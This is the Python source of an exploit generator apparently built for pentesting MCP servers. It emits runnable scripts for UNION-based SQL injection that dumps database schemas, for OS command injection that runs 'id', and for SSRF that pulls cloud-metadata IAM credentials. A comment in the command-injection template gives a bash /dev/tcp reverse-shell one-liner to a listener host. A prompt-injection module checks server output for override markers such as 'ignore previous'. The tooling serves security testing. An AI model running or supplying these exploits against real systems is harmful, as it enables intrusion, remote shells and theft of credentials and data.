"""PoC generator — creates runnable Python exploit scripts from mcpray findings."""
from __future__ import annotations

import json
import re
from pathlib import Path

from ..findings import AbuseCategory, Finding, ScanResult, Severity


# ── Shared extraction helpers ────────────────────────────────────────────────

def _py_str(value: str) -> str:
    """Render a Python string literal for embedding in generated source."""
    return json.dumps(value)


def _extract_resource_uri(finding: Finding) -> str | None:
    blob = "\n".join(finding.reproduction_steps) + "\n" + finding.evidence
    m = re.search(r'"uri"\s*:\s*"([^"]+)"', blob)
    if m:
        return m.group(1)
    m = re.search(r"read_resource\(\s*['\"]([^'\"]+)['\"]", blob)
    if m:
        return m.group(1)
    return None


def _extract_template_param(finding: Finding) -> tuple[str | None, str | None]:
    """Return (uri_template, param_name) from the affected_component string."""
    m = re.search(r"([a-z0-9_]+://\S*\{(\w+)\}\S*)", finding.affected_component, re.I)
    if m:
        return m.group(1), m.group(2)
    # Fall back to a bare scheme + first {param} anywhere in the finding text.
    blob = finding.affected_component + "\n" + finding.evidence
    m = re.search(r"([a-z0-9_]+://\S*\{(\w+)\}\S*)", blob, re.I)
    if m:
        return m.group(1), m.group(2)
    return None, None


def _extract_tool_and_param(finding: Finding) -> tuple[str | None, str | None]:
    m = re.search(r"Tool:\s*([a-zA-Z0-9_]+)", finding.affected_component)
    tool = m.group(1) if m else None
    m = re.search(r"Parameter:\s*([a-zA-Z0-9_]+)", finding.affected_component)
    param = m.group(1) if m else None
    if param is None:
        m = re.search(r"param:\s*([a-zA-Z0-9_]+)", finding.affected_component)
        param = m.group(1) if m else None
    return tool, param


def _extract_tool_call(finding: Finding) -> tuple[str | None, dict]:
    blob = "\n".join(finding.reproduction_steps)
    m = re.search(r"call_tool\(\s*['\"]([^'\"]+)['\"]\s*,\s*(\{.*?\})\s*\)", blob)
    if not m:
        return None, {}
    tool = m.group(1)
    try:
        args = json.loads(m.group(2).replace("'", '"'))
    except Exception:
        args = {}
    return tool, args


def _doc_header(finding: Finding, target: str, what: str) -> str:
    steps = "\n".join(f"  {i + 1}. {s}" for i, s in enumerate(finding.reproduction_steps))
    return (
        '"""\n'
        f"mcpray PoC — {finding.title}\n"
        f"Finding ID : {finding.id}\n"
        f"Severity   : {finding.severity.value}\n"
        f"Target     : {target}\n"
        f"Component  : {finding.affected_component}\n"
        "\n"
        f"{what}\n"
        "\n"
        "Original reproduction steps:\n"
        f"{steps}\n"
        "\n"
        "Run:\n"
        "  pip install fastmcp\n"
        "  python " + f"{_poc_filename(finding)}\n"
        '"""\n'
    )


def _poc_filename(finding: Finding) -> str:
    fid = re.sub(r"[^A-Za-z0-9_]+", "_", finding.id).strip("_") or "finding"
    return f"poc_{fid}_{finding.severity.value.lower()}.py"


# ── Per-category PoC generators ──────────────────────────────────────────────

def _gen_sqli_poc(finding: Finding, target: str) -> str:
    template, param = _extract_template_param(finding)
    template = template or "price://{item}"
    param = param or "item"
    marker = "1337mcpray"
    header = _doc_header(
        finding, target,
        "Demonstrates UNION-based SQL injection in an MCP resource template. The\n"
        "script confirms injection with a string marker, then dumps sqlite_master.",
    )
    return header + f'''
import asyncio
import urllib.parse

from fastmcp import Client

TARGET = {_py_str(target)}
TEMPLATE = {_py_str(template)}
PARAM = {_py_str(param)}
MARKER = {_py_str(marker)}


def fill(payload: str) -> str:
    # | is not an RFC-3986 path char — keep the SQL operators we need readable.
    enc = urllib.parse.quote(payload, safe="'(),-_*=.!><")
    return TEMPLATE.replace("{{" + PARAM + "}}", enc)


def read_text(result) -> str:
    items = getattr(result, "contents", None) or (
        result if isinstance(result, list) else [result]
    )
    out = []
    for it in items:
        t = getattr(it, "text", None)
        if t is not None:
            out.append(str(t))
    return "\\n".join(out)


async def main() -> None:
    async with Client(TARGET) as client:
        # 1. Find the injectable UNION column count (1..10).
        col_count = 0
        for n in range(1, 11):
            nulls = ",".join(["NULL"] * n)
            uri = fill(f"x' UNION SELECT {{nulls}}--")
            resp = read_text(await client.read_resource(uri))
            if resp.strip() and "error" not in resp.lower()[:100]:
                col_count = n
                break
        if not col_count:
            print("[-] Could not determine column count — target may be patched.")
            return
        print(f"[+] UNION column count: {{col_count}}")

        # 2. Find a string-reflecting column using a unique marker.
        str_col = 0
        for i in range(1, col_count + 1):
            parts = ["NULL"] * col_count
            parts[i - 1] = f"'{{MARKER}}'"
            uri = fill("x' UNION SELECT " + ",".join(parts) + "--")
            if MARKER in read_text(await client.read_resource(uri)):
                str_col = i
                break
        if not str_col:
            print("[-] No string-injectable column found.")
            return
        print(f"[+] String column index: {{str_col}}")

        def inject(expr: str) -> str:
            parts = ["NULL"] * col_count
            parts[str_col - 1] = expr
            return "x' UNION SELECT " + ",".join(parts) + "--"

        # 3. Fingerprint the database.
        ver = read_text(await client.read_resource(fill(inject("sqlite_version()"))))
        print(f"[+] sqlite_version(): {{ver.strip()}}")

        # 4. Dump the schema from sqlite_master.
        uri = fill(inject("group_concat(name,char(124)) FROM sqlite_master "
                          "WHERE type='table'--"))
        tables = read_text(await client.read_resource(uri))
        print("[+] Tables:")
        for t in tables.split("|"):
            if t.strip():
                print(f"      - {{t.strip()}}")


if __name__ == "__main__":
    asyncio.run(main())
'''


def _gen_cmdinj_poc(finding: Finding, target: str) -> str:
    tool, param = _extract_tool_and_param(finding)
    call_tool, call_args = _extract_tool_call(finding)
    tool = tool or call_tool or "run_command"
    param = param or "input"
    # Reuse the confirmed payload from the finding if present, else a marker echo.
    confirmed_payload = None
    if call_args and param in call_args:
        confirmed_payload = call_args[param]
    payload = confirmed_payload or "test; echo MCPRAY_CMDI_7z9x"
    header = _doc_header(
        finding, target,
        "Demonstrates OS command injection in an MCP tool parameter. The script\n"
        "calls the vulnerable tool with the confirmed payload and prints command\n"
        "output. To catch a reverse shell instead, start a listener first:\n"
        "    nc -lvnp 4444\n"
        "and swap PAYLOAD for a reverse-shell one-liner.",
    )
    return header + f'''
import asyncio

from fastmcp import Client

TARGET = {_py_str(target)}
TOOL = {_py_str(tool)}
PARAM = {_py_str(param)}
# Confirmed injection payload. ';' chains a second command after the tool's own.
PAYLOAD = {_py_str(payload)}

# Reverse shell example (uncomment + start `nc -lvnp 4444` on LHOST first):
#   LHOST, LPORT = "10.10.14.1", 4444
#   PAYLOAD = f"test; bash -c 'bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1'"


def tool_text(result) -> str:
    out = []
    for c in getattr(result, "content", []) or []:
        t = getattr(c, "text", None)
        if t is not None:
            out.append(str(t))
    return "\\n".join(out)


async def main() -> None:
    async with Client(TARGET) as client:
        print(f"[*] Calling tool '{{TOOL}}' with injection payload...")
        result = await client.call_tool(TOOL, {{PARAM: PAYLOAD}})
        body = tool_text(result)
        print("[+] Tool response:")
        print(body or "  <empty>")
        if "MCPRAY_CMDI_7z9x" in body:
            print("[+] Marker found — command execution confirmed.")
        # Follow-up: identify the executing user.
        whoami = await client.call_tool(TOOL, {{PARAM: "test; id"}})
        print("[+] id output:")
        print(tool_text(whoami) or "  <empty>")


if __name__ == "__main__":
    asyncio.run(main())
'''


def _gen_ssrf_poc(finding: Finding, target: str) -> str:
    tool, param = _extract_tool_and_param(finding)
    call_tool, call_args = _extract_tool_call(finding)
    tool = tool or call_tool or "fetch_url"
    param = param or "url"
    header = _doc_header(
        finding, target,
        "Demonstrates Server-Side Request Forgery in an MCP tool. The script\n"
        "coerces the server into fetching the AWS instance metadata endpoint and\n"
        "prints whatever internal content comes back.",
    )
    return header + f'''
import asyncio

from fastmcp import Client

TARGET = {_py_str(target)}
TOOL = {_py_str(tool)}
PARAM = {_py_str(param)}

# Internal targets the server should never be able to reach on our behalf.
SSRF_URLS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://localhost/",
]


def tool_text(result) -> str:
    out = []
    for c in getattr(result, "content", []) or []:
        t = getattr(c, "text", None)
        if t is not None:
            out.append(str(t))
    return "\\n".join(out)


async def main() -> None:
    async with Client(TARGET) as client:
        for url in SSRF_URLS:
            print(f"[*] Asking '{{TOOL}}' to fetch {{url}}")
            result = await client.call_tool(TOOL, {{PARAM: url}})
            body = tool_text(result)
            if body.strip():
                print("[+] Fetched internal content:")
                print(body[:1000])
            else:
                print("[-] No content returned.")
            print("-" * 60)


if __name__ == "__main__":
    asyncio.run(main())
'''


def _gen_pi_poc(finding: Finding, target: str) -> str:
    uri = _extract_resource_uri(finding)
    tool, param = _extract_tool_and_param(finding)
    header = _doc_header(
        finding, target,
        "Demonstrates (indirect) prompt injection. The script reads the affected\n"
        "resource / calls the tool and prints the returned content. The injected\n"
        "directives in that content would be interpreted as instructions by any\n"
        "AI client that ingests this server's output.",
    )
    if uri is not None:
        access = f'''        print("[*] Reading resource {{}}".format(URI))
        result = await client.read_resource(URI)
        items = getattr(result, "contents", None) or (
            result if isinstance(result, list) else [result]
        )
        body = "\\n".join(str(getattr(it, "text", "")) for it in items)'''
        consts = f"URI = {_py_str(uri)}"
    else:
        tool = tool or "get_note"
        param = param or "id"
        access = f'''        print("[*] Calling tool {{}}".format(TOOL))
        result = await client.call_tool(TOOL, {{PARAM: "1"}})
        body = "\\n".join(
            str(getattr(c, "text", "")) for c in getattr(result, "content", []) or []
        )'''
        consts = f"TOOL = {_py_str(tool)}\nPARAM = {_py_str(param)}"
    return header + f'''
import asyncio

from fastmcp import Client

TARGET = {_py_str(target)}
{consts}


async def main() -> None:
    async with Client(TARGET) as client:
{access}
        print("[+] Returned content (interpreted by an AI client as context):")
        print(body)
        markers = ["ignore previous", "system:", "</instructions>", "<!--"]
        if any(m in body.lower() for m in markers):
            print("[+] Injected directive(s) detected in the content.")
        print(
            "[!] An AI client consuming this output would treat the injected "
            "text as instructions, not data."
        )


if __name__ == "__main__":
    asyncio.run(main())
'''


def _gen_generic_poc(finding: Finding, target: str) -> str:
    uri = _extract_resource_uri(finding)
    tool, param = _extract_tool_and_param(finding)
    call_tool, call_args = _extract_tool_call(finding)
    header = _doc_header(
        finding, target,
        "Generic PoC: connects to the MCP server and exercises the affected\n"
        "component to reproduce the reported behaviour.",
    )
    if uri is not None:
        body = f'''        print("[*] Reading resource {{}}".format(URI))
        result = await client.read_resource(URI)
        items = getattr(result, "contents", None) or (
            result if isinstance(result, list) else [result]
        )
        for it in items:
            print(getattr(it, "text", it))'''
        consts = f"URI = {_py_str(uri)}"
    elif tool or call_tool:
        tname = tool or call_tool
        args = call_args or ({param: "test"} if param else {})
        body = f'''        print("[*] Calling tool {{}}".format(TOOL))
        result = await client.call_tool(TOOL, ARGS)
        for c in getattr(result, "content", []) or []:
            print(getattr(c, "text", c))'''
        consts = f"TOOL = {_py_str(tname)}\nARGS = {json.dumps(args)}"
    else:
        body = '''        print("[*] Listing server inventory")
        for t in await client.list_tools():
            print("tool:", t.name)
        for r in await client.list_resources():
            print("resource:", getattr(r, "uri", r))'''
        consts = "# No specific payload extracted — falling back to enumeration."
    return header + f'''
import asyncio

from fastmcp import Client

TARGET = {_py_str(target)}
{consts}


async def main() -> None:
    async with Client(TARGET) as client:
{body}


if __name__ == "__main__":
    asyncio.run(main())
'''


# ── Routing ──────────────────────────────────────────────────────────────────

def finding_to_poc(finding: Finding, target: str) -> str:
    """Route a finding to the most specific PoC generator."""
    tags = {t.lower() for t in finding.tags}
    cats = set(finding.abuse_categories)

    if "sql-injection" in tags or "sqli" in tags:
        return _gen_sqli_poc(finding, target)
    if {"command-injection", "cmdi", "rce"} & tags or AbuseCategory.REMOTE_EXECUTION in cats:
        return _gen_cmdinj_poc(finding, target)
    if "ssrf" in tags or AbuseCategory.SSRF in cats:
        return _gen_ssrf_poc(finding, target)
    if (
        {"prompt-injection", "context-poison", "indirect-prompt-injection"} & tags
        or AbuseCategory.PROMPT_INJECTION in cats
    ):
        return _gen_pi_poc(finding, target)
    return _gen_generic_poc(finding, target)


# ── Bulk generation ──────────────────────────────────────────────────────────

def _qualifying(scan_result: ScanResult, min_severity: Severity) -> list[Finding]:
    floor = min_severity.numeric
    return [f for f in scan_result.findings if f.severity.numeric >= floor]


def _kind(finding: Finding) -> str:
    tags = {t.lower() for t in finding.tags}
    cats = set(finding.abuse_categories)
    if "sql-injection" in tags or "sqli" in tags:
        return "SQL injection"
    if {"command-injection", "cmdi", "rce"} & tags or AbuseCategory.REMOTE_EXECUTION in cats:
        return "Command injection"
    if "ssrf" in tags or AbuseCategory.SSRF in cats:
        return "SSRF"
    if {"prompt-injection", "context-poison"} & tags or AbuseCategory.PROMPT_INJECTION in cats:
        return "Prompt injection"
    return "Generic"


def _pocs_readme(target: str, entries: list[tuple[str, Finding]]) -> str:
    lines = [
        "# mcpray — Proof-of-Concept Exploits",
        "",
        f"Target: `{target}`",
        "",
        "Each script is standalone and depends only on `fastmcp`:",
        "",
        "```bash",
        "pip install fastmcp",
        "python poc_<id>_<severity>.py",
        "```",
        "",
        "> These scripts actively interact with the target. Only run them against",
        "> systems you are authorised to test.",
        "",
        "## Included PoCs",
        "",
    ]
    for fname, finding in entries:
        lines.append(
            f"- `{fname}` — **{finding.severity.value}** — {_kind(finding)} — {finding.title}"
        )
    lines.append("")
    return "\n".join(lines)


def generate_all_pocs(
    scan_result: ScanResult,
    output_dir: str,
    min_severity: Severity = Severity.HIGH,
) -> list[str]:
    """Generate one ``.py`` PoC file per qualifying finding, plus a README index."""
    out = Path(output_dir) / "pocs"
    out.mkdir(parents=True, exist_ok=True)

    written: list[str] = []
    entries: list[tuple[str, Finding]] = []
    seen: dict[str, int] = {}

    for finding in _qualifying(scan_result, min_severity):
        fname = _poc_filename(finding)
        count = seen.get(fname, 0)
        seen[fname] = count + 1
        if count:
            fname = fname[:-3] + f"_{count}.py"

        path = out / fname
        path.write_text(finding_to_poc(finding, scan_result.target), encoding="utf-8")
        written.append(str(path))
        entries.append((fname, finding))

    readme = out / "README.md"
    readme.write_text(_pocs_readme(scan_result.target, entries), encoding="utf-8")
    written.append(str(readme))

    return written


def _indent(code: str, spaces: int) -> str:
    pad = " " * spaces
    return "\n".join(pad + line if line.strip() else line for line in code.splitlines())


def generate_poc_bundle(
    scan_result: ScanResult,
    output_path: str,
) -> str:
    """Combine all HIGH+ PoCs into one runnable script with per-finding sections."""
    out = Path(output_path)
    if out.suffix.lower() != ".py":
        out = out.with_suffix(".py")
    out.parent.mkdir(parents=True, exist_ok=True)

    findings = _qualifying(scan_result, Severity.HIGH)
    target = scan_result.target

    sections: list[str] = []
    calls: list[str] = []

    for idx, finding in enumerate(findings):
        func = f"exploit_{idx}_{re.sub(r'[^A-Za-z0-9_]+', '_', finding.id).strip('_')}"
        kind = _kind(finding)
        # Inline the per-finding logic as an async function body. We reuse the
        # category generators' core actions through fastmcp directly so the bundle
        # has no mcpray dependency.
        body = _bundle_section_body(finding, kind)
        section = (
            f"async def {func}(client: Client) -> None:\n"
            f'    """[{finding.severity.value}] {kind} — {finding.title}\n\n'
            f"    Component: {finding.affected_component}\n"
            f'    """\n'
            f'    print("\\n" + "=" * 70)\n'
            f'    print({_py_str(f"[{finding.severity.value}] {kind}: {finding.title}")})\n'
            f'    print("=" * 70)\n'
            f"{_indent(body, 4)}\n"
        )
        sections.append(section)
        calls.append(f"        await {func}(client)")

    if not calls:
        calls.append("        print('No HIGH+ findings to exploit.')")

    header = (
        '"""\n'
        "mcpray — combined PoC bundle\n"
        f"Target: {target}\n"
        f"Findings included (HIGH and above): {len(findings)}\n"
        "\n"
        "Each section is an independent async exploit; main() runs them in order.\n"
        "Depends only on fastmcp:  pip install fastmcp\n"
        '"""\n'
        "from __future__ import annotations\n\n"
        "import asyncio\n\n"
        "from fastmcp import Client\n\n"
        f"TARGET = {_py_str(target)}\n\n\n"
        "def _text(result) -> str:\n"
        "    parts = []\n"
        "    items = getattr(result, 'contents', None)\n"
        "    if items is None:\n"
        "        items = getattr(result, 'content', None)\n"
        "    if items is None:\n"
        "        items = result if isinstance(result, list) else [result]\n"
        "    for it in items:\n"
        "        t = getattr(it, 'text', None)\n"
        "        if t is not None:\n"
        "            parts.append(str(t))\n"
        "    return '\\n'.join(parts)\n\n\n"
    )

    body = "\n\n".join(sections)
    main = (
        "\n\nasync def main() -> None:\n"
        "    async with Client(TARGET) as client:\n"
        + "\n".join(calls)
        + "\n\n\nif __name__ == '__main__':\n"
        "    asyncio.run(main())\n"
    )

    out.write_text(header + body + main, encoding="utf-8")
    return str(out)


def _bundle_section_body(finding: Finding, kind: str) -> str:
    """Produce the inner body of a bundle section using the shared `_text` helper."""
    if kind == "SQL injection":
        template, param = _extract_template_param(finding)
        template = template or "price://{item}"
        param = param or "item"
        return (
            f"template = {_py_str(template)}\n"
            f"param = {_py_str(param)}\n"
            "import urllib.parse\n"
            "def fill(p):\n"
            "    return template.replace('{' + param + '}', "
            "urllib.parse.quote(p, safe=\"'(),-_*=.!><\"))\n"
            "for n in range(1, 11):\n"
            "    nulls = ','.join(['NULL'] * n)\n"
            "    resp = _text(await client.read_resource(fill(f\"x' UNION SELECT {nulls}--\")))\n"
            "    if resp.strip() and 'error' not in resp.lower()[:100]:\n"
            "        print(f'[+] UNION injectable with {n} columns')\n"
            "        break\n"
            "else:\n"
            "    print('[-] Not injectable (target may be patched)')"
        )
    if kind == "Command injection":
        tool, param = _extract_tool_and_param(finding)
        call_tool, call_args = _extract_tool_call(finding)
        tool = tool or call_tool or "run_command"
        param = param or "input"
        payload = call_args.get(param, "test; echo MCPRAY_CMDI_7z9x") if call_args else "test; echo MCPRAY_CMDI_7z9x"
        return (
            f"result = await client.call_tool({_py_str(tool)}, "
            f"{{{_py_str(param)}: {_py_str(payload)}}})\n"
            "body = _text(result)\n"
            "print(body or '  <empty>')\n"
            "print('[+] confirmed' if 'MCPRAY_CMDI_7z9x' in body else '[-] not confirmed')"
        )
    if kind == "SSRF":
        tool, param = _extract_tool_and_param(finding)
        call_tool, _ = _extract_tool_call(finding)
        tool = tool or call_tool or "fetch_url"
        param = param or "url"
        return (
            f"result = await client.call_tool({_py_str(tool)}, "
            f"{{{_py_str(param)}: 'http://169.254.169.254/latest/meta-data/'}})\n"
            "print(_text(result)[:1000] or '  <no content>')"
        )
    if kind == "Prompt injection":
        uri = _extract_resource_uri(finding)
        if uri:
            return (
                f"body = _text(await client.read_resource({_py_str(uri)}))\n"
                "print(body)\n"
                "print('[!] Injected directives would be interpreted by an AI client.')"
            )
        tool, _ = _extract_tool_and_param(finding)
        tool = tool or "get_note"
        return (
            f"result = await client.call_tool({_py_str(tool)}, {{'id': '1'}})\n"
            "print(_text(result))\n"
            "print('[!] Injected directives would be interpreted by an AI client.')"
        )
    # Generic
    uri = _extract_resource_uri(finding)
    if uri:
        return f"print(_text(await client.read_resource({_py_str(uri)})))"
    tool, param = _extract_tool_and_param(finding)
    call_tool, call_args = _extract_tool_call(finding)
    tname = tool or call_tool
    if tname:
        args = call_args or ({param: "test"} if param else {})
        return (
            f"result = await client.call_tool({_py_str(tname)}, {json.dumps(args)})\n"
            "print(_text(result))"
        )
    return "print('tools:', [t.name for t in await client.list_tools()])"
